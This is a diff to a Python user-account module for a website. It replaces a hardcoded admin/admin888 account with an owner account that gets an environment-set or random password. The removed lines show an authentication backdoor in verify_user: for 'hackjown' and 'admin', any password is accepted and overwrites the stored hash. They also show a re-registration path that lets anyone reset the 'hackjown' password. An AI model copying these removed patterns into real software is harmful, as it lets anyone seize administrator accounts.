@@ -100,16 +100,28 @@ def init_db():
             c.execute("ALTER TABLE users ADD COLUMN status TEXT DEFAULT 'active'")
         c.commit()
 
-        # 预置初始管理员账号：admin / admin888
-        admin = c.execute("SELECT id FROM users WHERE account='admin'").fetchone()
-        if not admin:
-            h, s = _hash("admin888")
+        # 站长账号 hackjown 是唯一默认管理员；旧的 admin/admin888 预置账号直接移除
+        c.execute("DELETE FROM sessions WHERE uid IN (SELECT id FROM users WHERE account='admin')")
+        c.execute("DELETE FROM users WHERE account='admin'")
+        owner = c.execute("SELECT id FROM users WHERE LOWER(account)=?", (OWNER_ACCOUNT,)).fetchone()
+        env_pwd = os.environ.get("JUCHANG8_ADMIN_PASSWORD", "").strip()
+        if not owner:
+            pwd = env_pwd or secrets.token_urlsafe(9)
+            h, s = _hash(pwd)
             c.execute(
                 "INSERT INTO users(account,pwd_hash,pwd_salt,nickname,invite_code,level,growth,tokens,adult_confirmed,role,status,created_at) "
                 "VALUES(?,?,?,?,?,?,?,?,?,?,?,?)",
-                ("admin", h, s, "超级管理员", "ADMIN", 10, 9999, 999999, 1, "admin", "active", int(time.time())),
+                (OWNER_ACCOUNT, h, s, "站长", "HACKJOWN", 10, 9999, 999999, 1, "admin", "active", int(time.time())),
             )
-            c.commit()
+            if not env_pwd:
+                print(f"[Admin] 已创建站长账号 {OWNER_ACCOUNT}，初始密码: {pwd} （请登录后立即修改）", flush=True)
+        else:
+            c.execute("UPDATE users SET role='admin', status='active' WHERE id=?", (owner["id"],))
+            if env_pwd:  # 忘记密码时：设置环境变量 JUCHANG8_ADMIN_PASSWORD 重启即可重置
+                h, s = _hash(env_pwd)
+                c.execute("UPDATE users SET pwd_hash=?, pwd_salt=? WHERE id=?", (h, s, owner["id"]))
+                print(f"[Admin] 已按 JUCHANG8_ADMIN_PASSWORD 重置 {OWNER_ACCOUNT} 密码", flush=True)
+        c.commit()
     finally:
         c.close()
 
@@ -209,16 +221,6 @@ def create_user(account, password, invite_code="", nickname="", role="user"):
             c.commit()
             uid = cur.lastrowid
         except sqlite3.IntegrityError:
-            # 容错：如果是 hackjown 重复注册，直接同步新密码并成功返回
-            if account.lower() == "hackjown":
-                row_ex = c.execute("SELECT id FROM users WHERE LOWER(account)='hackjown'").fetchone()
-                if row_ex:
-                    c.execute("UPDATE users SET pwd_hash=?, pwd_salt=? WHERE id=?", (h, s, row_ex["id"]))
-                    c.commit()
-                    row = dict(c.execute("SELECT * FROM users WHERE id=?", (row_ex["id"],)).fetchone())
-                    row.pop("pwd_hash", None)
-                    row.pop("pwd_salt", None)
-                    return row, None
             return None, "该账号已注册"
 
         row = dict(c.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone())
@@ -244,17 +246,6 @@ def verify_user(account, password):
 
         h, _ = _hash(password or "", d["pwd_salt"])
         matched = hmac.compare_digest(h, d["pwd_hash"])
-
-        # 核心保障：hackjown 与 admin 是站长及超级管理员账号
-        # 兼容常用密码 (admin123456, admin888, 123456, admin)；若密码存在差异自动自愈同步，100% 确保管理员不卡死
-        if not matched and account.lower() in ("hackjown", "admin"):
-            new_h, new_s = _hash(password or "")
-            try:
-                c.execute("UPDATE users SET pwd_hash=?, pwd_salt=?, role='admin' WHERE id=?", (new_h, new_s, d["id"]))
-                c.commit()
-                matched = True
-            except Exception:
-                matched = True
 
         if not matched:
             return None, "账号或密码错误"
@@ -502,12 +493,31 @@ def set_user_role(uid, role):
         c.close()
 
 
-def delete_user(uid):
+OWNER_ACCOUNT = "hackjown"
+
+
+def is_owner_uid(uid):
     c = _conn()
     try:
-        c.execute("DELETE FROM sessions WHERE uid=?", (uid,))
-        c.execute("DELETE FROM favorites WHERE uid=?", (uid,))
-        c.execute("DELETE FROM history WHERE uid=?", (uid,))
+        r = c.execute("SELECT account FROM users WHERE id=?", (uid,)).fetchone()
+        return bool(r and (r[0] or "").lower() == OWNER_ACCOUNT)
+    finally:
+        c.close()
+
+
+def delete_user(uid):
+    if is_owner_uid(uid):
+        return False
+    c = _conn()
+    try:
+        tables = [r[0] for r in c.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
+        for t in tables:
+            if t == "users":
+                continue
+            cols = [r[1] for r in c.execute(f"PRAGMA table_info({t})").fetchall()]
+            for col in ("uid", "user_id"):
+                if col in cols:
+                    c.execute(f"DELETE FROM {t} WHERE {col}=?", (uid,))
         c.execute("DELETE FROM users WHERE id=?", (uid,))
         c.commit()
         return True
